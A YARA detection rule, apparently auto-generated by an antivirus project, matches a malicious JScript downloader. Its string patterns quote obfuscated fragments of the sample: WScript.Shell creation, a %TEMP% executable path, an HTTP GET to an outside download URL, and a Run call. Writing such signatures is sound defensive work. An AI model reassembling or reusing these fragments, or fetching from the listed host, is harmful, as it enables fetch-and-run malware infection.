rule sig_20160401_3861dd2fae79f1e1ffe0eb13bd057354 {
  meta:
    description = "datamaliciousorder - file 20160401_3861dd2fae79f1e1ffe0eb13bd057354.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d6f35968fd185be5087a83817b8634bb7d2eda5ff1c1b631471909c964b11233"

  strings:
    $s1  = "var OyAl = function TfIl() {return WScript[EpDg](\"WScript\"+\".Shell\");}(), RatMhf = 11;" fullword ascii
    $s2  = "function SygBy(HmDp, FuFy){RqlBxo = RqlBxo * 1; return HmDp - FuFy;};" fullword ascii
    $s3  = "if (AevDqq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function FceOpy() {return OyAl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KxxAB4tTzjUa.ex\" + \"e\";};" fullword ascii
    $s5  = "function DgyFby(){return GvRp + \"\";};" fullword ascii
    $s6  = "AevDqq[RfcCa](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s7  = "function AyYfe() {return ((CrHyq == true) && (CrHyq == SwsXgs)) ? 1 : RqlBxo;};" fullword ascii
    $s8  = "function DjEd()" fullword ascii
    $s9  = "var CrHyq = false;" fullword ascii
    $s10 = "function ApQwf(){return 23;};" fullword ascii
    $s11 = "CrHyq = true; " fullword ascii
    $s12 = "var YxmFh = false;" fullword ascii
    $s13 = "SwsXgs = true; " fullword ascii
    $s14 = "var BnKym = new this[\"Date\"]();" fullword ascii
    $s15 = "}while (XqnDz);" fullword ascii
    $s16 = "return SygBy(CkGy, HeLwz);" fullword ascii
    $s17 = "function QdUw(){return EpDg;};" fullword ascii
    $s18 = "function NsIu(FyAaz){OyAl[\"R\"+\"un\"](FyAaz, RqlBxo, RqlBxo);};" fullword ascii
    $s19 = "var SwsXgs = false;" fullword ascii
    $s20 = "function LtVif(OsXsi) {var TvYb = (1, 2, 3, 4, 5, OsXsi); return TvYb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}